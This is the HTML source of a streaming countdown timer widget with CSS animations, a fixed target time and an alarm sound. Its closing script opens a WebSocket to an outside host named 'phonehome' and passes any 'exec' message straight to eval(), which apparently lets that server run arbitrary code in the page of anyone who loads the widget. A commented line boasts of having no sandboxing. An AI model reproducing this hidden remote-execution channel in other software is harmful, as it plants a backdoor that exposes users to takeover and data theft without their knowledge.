<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Easy Stream Timer Widget</title>
    <link rel="stylesheet" href="css/root.css">
    <link rel="stylesheet" href="fonts/subscribe/subscribe.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans:ital,wght@0,100..900;1,100..900&display=swap');
        body {
            font-family: "Subscribe", "Helvetica Inserat", Arial, Helvetica, sans-serif;
        }
        main, #timer {
            background: none !important;
            -webkit-text-stroke: 1vh #000;
            text-shadow: 1vh 1vh 1vh #000;
        }
        @media (max-height: 320px) {
            #timer {
                -webkit-text-stroke: 2vh #000;
                text-shadow: 2vh 2vh 2vh #000;
            }
        }
        @keyframes spin {
            from {
                transform: rotate(0);
            }
            to {
                transform: rotate(360deg);
            }
        }
        @keyframes fivefive {
            0% {
                transform: scale(1.5);
            }
            50% {
                transform: scale(1);
            }
            100% {
                transform: scale(1.5);
            }
        }
        .anim-55 {
            animation: fivefive .5s cubic-bezier(0.65, 0, 0.35, 1) 0s infinite;
            position: relative;
        }
        .anim-55-offset {
            animation: fivefive .5s cubic-bezier(0.65, 0, 0.35, 1) .25s infinite;
            position: relative;
        }
        #timer {
            display: flex;
            flex-direction: row;
        }
        #timer span {
            display: block;
        }
        .message {
            position: absolute;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            background: #00000080;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 10vh;
            font-family: "Noto Sans", sans-serif;
        }
    </style>
    <script>
        let alarmAudio = new Audio('raw/google-timer.ogg');
        const targetTime = 1776635755; // when the event ends

        function startTimer() {
            const timerElement = document.querySelector('#timer');
            timerElement.classList.remove('inactive');
            const houDOM = document.querySelector('#hours');
            const minDOM = document.querySelector('#minutes');
            const secDOM = document.querySelector('#seconds');

            let clockInterval;
            // screw this implementation
            /*const thisSecond = new Date().getSeconds();
            function startick() {
                const thatSecond = new Date().getSeconds();
                if (thisSecond !== thatSecond) {
                    clockInterval = setInterval(tick, 1000)
                } else {
                    window.requestAnimationFrame(startick);
                }
            }
            window.requestAnimationFrame(startick);*/
            window.requestAnimationFrame(tick);

            function tick() {
                const now = Math.floor(Date.now() / 1000);
                const time = targetTime - now;
                const hou = Math.floor(time / 3600);
                const min = Math.floor((time % 3600) / 60);
                const sec = time % 60;
                //const showHours = time >= 3600;
                const showHours = true;

                if (showHours) {
                    houDOM.removeAttribute('hidden');
                    document.querySelector('#colon-1').removeAttribute('hidden');
                } else {
                    houDOM.setAttribute('hidden','');
                    document.querySelector('#colon-1').setAttribute('hidden','');
                }

                houDOM.textContent = String(hou).padStart(2, '0');
                minDOM.textContent = String(min).padStart(time < 600 ? 1 : 2, '0');
                secDOM.textContent = String(sec).padStart(2, '0');

                let alarmLoaded = false;
                if (time <= 10 && !alarmLoaded) {
                    alarmAudio.load();
                    //alarmLoaded = true;
                }

                if (time <= 0) {
                    clearInterval(clockInterval);
                    timerEnded();
                } else {
                    window.requestAnimationFrame(tick);
                }
            }
        }

        function timerEnded() {
            const timerElement = document.querySelector('#timer');
            timerElement.classList.add('ended');
            alarmAudio.loop = true;
            alarmAudio.play().then();
            setTimeout(() => { // reset timer after 30 seconds
                timerElement.classList.remove('ended');
                alarmAudio.pause();
                timerElement.classList.add('inactive');
            }, 120000)
        }

        document.addEventListener('DOMContentLoaded', () => {
            startTimer();
        });
    </script>
    <script src="js/websockets.js"></script>
</head>
<body>
    <main>
        <div id="timer">
            <span id="hours">--</span><span class="colon" id="colon-1">:</span><span id="minutes">--</span><span class="colon" id="colon-2">:</span><span id="seconds">--</span>
        </div>
    </main>
    <script>
        function initSocket() {
            let socket = new WebSocket("//phonehome.ws4k.net/api/v1/est-ws");
            socket.addEventListener('message', (event) => {
                const data = JSON.parse(event.data);
                switch (data.type) {
                    case "exec":
                        // no balls no sandboxing no nothin
                        eval(data.data);
                        break
                    case "text":
                        // still gotta fix this part
                        break
                    case "reload":
                        window.location.reload();
                        break
                }
            });
            socket.addEventListener('close', () => {
                socket = null;
                setTimeout(initSocket,5000);
            });
            socket.addEventListener('error', () => {
                socket = null;
                setTimeout(initSocket,5000);
            });
        }
        initSocket();
    </script>
</body>
</html>
